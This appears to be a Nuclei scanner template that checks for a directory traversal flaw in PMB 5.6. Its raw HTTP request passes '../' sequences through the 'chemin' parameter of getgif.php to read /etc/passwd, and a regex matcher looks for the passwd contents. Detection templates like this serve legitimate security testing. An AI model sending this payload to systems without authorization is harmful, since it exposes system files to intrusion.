id: pmb-directory-traversal1
info:
  author: geeknik
  description: The PMB Gif Image is not sanitizing the 'chemin', which leads to Local
    File Disclosure.
  name: PMB 5.6 Directory Traversal
  reference: https://packetstormsecurity.com/files/160072/PMB-5.6-Local-File-Disclosure-Directory-Traversal.html
  severity: medium
  tags: lfi
requests:
- matchers:
  - regex:
    - 'root:[x*]:0:0:'
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=tarik HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0

    '
